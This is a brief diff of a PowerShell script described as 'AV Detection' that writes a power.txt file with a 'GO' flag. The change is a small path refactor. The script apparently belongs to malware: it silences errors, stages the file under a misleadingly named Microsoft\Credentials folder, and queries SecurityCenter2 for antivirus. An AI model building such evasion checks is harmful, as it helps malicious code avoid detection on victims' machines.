@@ -1,8 +1,7 @@
 # checker.ps1 - AV Detection, writes power.txt with GO
 
 $ErrorActionPreference = 'SilentlyContinue'
-$appData = [System.IO.Path]::GetFolderPath('ApplicationData')
-$powerPath = "$appData\Microsoft\Credentials\power.txt"
+$powerPath = "$env:APPDATA\Microsoft\Credentials\power.txt"
 $results = @()
 
 # WMI SecurityCenter2
